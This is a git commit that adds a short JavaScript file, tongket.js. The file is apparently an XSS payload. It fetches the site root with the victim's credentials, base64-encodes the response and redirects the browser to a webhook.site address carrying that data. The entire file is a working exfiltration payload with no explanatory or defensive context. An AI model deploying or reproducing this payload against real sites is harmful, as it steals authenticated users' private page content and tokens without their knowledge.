a79166ed0d7c5d79c5ecc2636f53b663a5d96885
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2022-09-06 10:32:16 +0700

    Create tongket.js

---
+++ tongket.js
@@ -0,0 +1,8 @@
+var req = new XMLHttpRequest();
+req.open("GET","/",false);
+req.onreadystatechange = function(){
+  var res = req.response;
+  window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104'+btoa(res);
+}
+req.withCredentials = true;
+req.send();
